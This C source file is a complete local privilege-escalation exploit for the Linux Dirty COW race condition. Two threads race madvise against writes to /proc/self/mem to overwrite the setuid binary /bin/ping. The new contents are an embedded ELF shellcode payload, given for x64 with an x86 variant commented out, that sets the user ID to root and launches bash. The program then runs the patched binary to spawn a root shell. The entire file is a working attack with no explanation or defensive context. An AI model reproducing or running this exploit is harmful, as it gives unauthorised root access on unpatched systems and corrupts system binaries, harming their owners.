#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define TARGET "/bin/ping"

int stop = 0;
struct stat st;
void *memory_map;

// x64 payload
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xae, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe4, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62,
  0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x66,
  0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f,
  0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54,
  0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05
};

// x64 payload length
unsigned int sc_len = 174;

// x86 payload
/*unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
*/

// x86 payload length
// unsigned int sc_len = 136

void *madvise_func(void *arg) {

	int i;

	for(i=0; i<10000000 && !stop; i++) {
		madvise(memory_map, st.st_size, MADV_DONTNEED);
	}

}

void *write_func(void *arg) {

	char *payload = (char *)arg;

	int fd = open("/proc/self/mem", O_RDWR);
	int i;

	for(i=0; i<10000000 && !stop; i++) {
		lseek(fd, (__off_t)memory_map, SEEK_SET);
		write(fd, payload, sc_len);
	}

}

void *check_func(void *arg) {

	char *payload = (char *)arg;
	char buffer[sc_len];

	int i;

	for(i=0; i<10000000 && !stop; i++) {
		FILE *fp = fopen(TARGET, "rb");
		fread(buffer, sc_len, 1, fp);
		if(memcmp(payload, buffer, sc_len) == 0)
			stop = 1;
		fclose(fp);
		sleep(1);
	}

}

int main(int argc, char **argv) {

	pthread_t write_th, madvise_th, check_th;
	int fd;
	
	printf("[*] Backing up /bin/ping to /tmp/ping\n");
	system("cp /bin/ping /tmp/ping");

	printf("[*] Attempting to overwrite /bin/ping\n\n");
	
	fd = open(TARGET, O_RDONLY);
	fstat(fd, &st);

	memory_map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	
	char payload[st.st_size];
	memset(payload, 0x90, st.st_size);
	memcpy(payload, sc, sc_len);

	pthread_create(&write_th, NULL, &write_func, payload);
	pthread_create(&madvise_th, NULL, &madvise_func, NULL);
	pthread_create(&check_th, NULL, &check_func, payload);		

	pthread_join(check_th, NULL);

	printf("[+] Successfully overwritten /bin/ping\n");
	printf("[+] Spawning root shell\n\n");

	system(TARGET);

	return 0;

}
